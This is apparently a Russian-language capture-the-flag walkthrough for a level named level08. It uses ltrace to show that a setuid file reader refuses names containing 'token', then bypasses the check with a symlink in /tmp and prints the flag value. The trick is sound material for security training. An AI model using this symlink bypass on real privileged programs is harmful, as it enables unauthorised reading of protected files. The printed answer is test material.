```
ls -l
```
> total 16\
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08\
-rw-------  1 flag08 flag08    26 Mar  5  2016 token

Пробуем запустить:

```
./level08
```
> ./level08 [file to read]

Создадим файл и проверим, что произойдет
```
echo 123 > /tmp/file;
./level08 /tmp/file
```
> 123

Вывелось содержимое файла, а значит он может прочитать содержимое файла token
```
./level08 ./token
```
> You may not access './token'

Не открывается, проверим, что происходит внутри скрипта
```
ltrace ./level08 token
```
> __libc_start_main(0x8048554, 2, 0xbffff7a4, 0x80486b0, 0x8048720 <unfinished ...>\
strstr("token", "token")                                                                                      = "token"\
printf("You may not access '%s'\n", "token"You may not access 'token'\
)                                                                  = 27\
exit(1 <unfinished ...>\
+++ exited (status 1) +++

Происходит сравнение того, что мы подаем с token, если это токен, то он не открывает файл

Создадим ссылку на этот файл и подадим его

```
ln -s /home/user/level08/token /tmp/exploit
```

Подадим ссылку:
```
./level08 /tmp/exploit
```
> quif5eloekouj29ke0vouxean
